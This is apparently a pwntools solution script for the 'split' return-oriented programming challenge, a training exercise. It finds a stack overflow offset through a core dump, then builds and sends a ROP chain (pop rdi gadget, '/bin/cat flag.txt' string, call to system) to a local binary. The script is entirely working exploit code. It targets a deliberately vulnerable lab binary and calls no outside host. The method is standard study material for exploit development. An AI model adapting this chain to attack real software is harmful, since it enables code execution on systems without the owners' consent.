from pwn import *

#
# Context
#

e = context.binary = ELF('split')

#
# ROP
#

# Use pwntools to find gadgets and strings
BINCAT = p64(next(e.search(b'/bin/cat flag.txt'))) # "/bin/cat flag.txt"
SYSTEM = p64(e.symbols["usefulFunction"] + 9) # call system; <junk>
POPRDI = p64(next(e.search(asm('pop rdi; ret'))))

#
# Offset
#

offset = 0

io = process(e.path)

io.sendlineafter(b'> ', cyclic(0x60))
io.wait()

core = io.corefile

io.close()

offset = cyclic_find(core.read(core.rsp, 4))
info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * offset
payload += POPRDI
payload += BINCAT
payload += SYSTEM

with open('payload', 'wb') as fout:
    fout.write(payload)

io = process(e.path)

io.sendlineafter(b'> ', payload)
info(io.recvuntil(b'}').decode())
io.close()